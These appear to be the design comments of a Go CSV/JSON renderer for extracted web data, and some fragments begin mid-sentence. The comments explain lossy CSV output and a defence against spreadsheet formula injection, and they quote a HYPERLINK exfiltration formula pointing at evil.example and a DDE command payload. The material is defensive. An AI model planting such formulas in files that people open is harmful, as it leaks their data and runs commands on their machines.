// Rendering, in two formats that are deliberately not equivalent.

// JSON is the complete form: every cell, every alternative a source disagreed
// about, every source and every quote. CSV is one value per cell because that is
// what a CSV is, so it is LOSSY — and rather than pretend otherwise it carries
// the columns that say so, and the doc comment says which format to use when the
// answer matters.
//
// A format that quietly dropped the disagreements would be the most convenient
// output and the least honest one.

// WriteCSV renders the dataset as CSV.
//
// Lossy on purpose, and it says so with columns rather than with prose, because
// a CSV has nowhere to put prose: a `sources` count and a `contested` column
// naming the fields the sources disagreed about. The JSON form is the one to use
// when a disagreement matters.

// columns called `sources` and two called `quote` — any reader keyed by name
// silently takes one of them, which is a misparse rather than an error.

// cleanCell removes what a spreadsheet would misread, and defuses what it would
// EXECUTE.
//
// A newline inside a quoted CSV field is legal and survives a correct reader, and
// is misread by enough of them that a dataset opened in the wrong tool looks
// corrupted. A tab likewise. Neither carries meaning in an extracted value.
//
// The second half is a security fix rather than a cosmetic one. Excel, LibreOffice
// and Google Sheets evaluate a cell whose first character is =, +, - or @, so a
// page containing
//
//	=HYPERLINK("http://evil.example?x="&A1,"click")
//
// becomes a live exfiltration link the moment somebody opens the file, and
// =cmd|' /C calc'!A0 is the DDE variant. mole extracts from arbitrary web pages
// into a file a user opens in a spreadsheet, which is the whole of that threat
// model — and a probe confirmed every one of those payloads reached the output
// untouched.
//
// The mitigation is the standard one: prefix a leading apostrophe, which every
// spreadsheet treats as "the rest is text" and which a CSV parser reading the file
// programmatically sees as one harmless character. Escaping the formula instead
// would change the value; refusing the row would lose data over a rendering
// concern.
// The whitespace half is one call, not five: strings.Fields splits on every
// unicode space, so the four ReplaceAll lines that preceded it were replacing
// characters it was about to split on anyway. Kept as a note because the
// replacements read like they were doing something.

//
// A NUMBER is never defused, and the first version of this did defuse them —
// `-` is both a formula leader and a minus sign, so every loss, decline and
// negative delta in a dataset became `'-1200000`, which a spreadsheet reads as
// text: no sum, no sort, no chart. coerceNumber produces exactly that string for
// a bracketed loss, so it was the common case rather than a corner.

// text column can legitimately hold a negative number and the rendering does not
// know which column it is in.
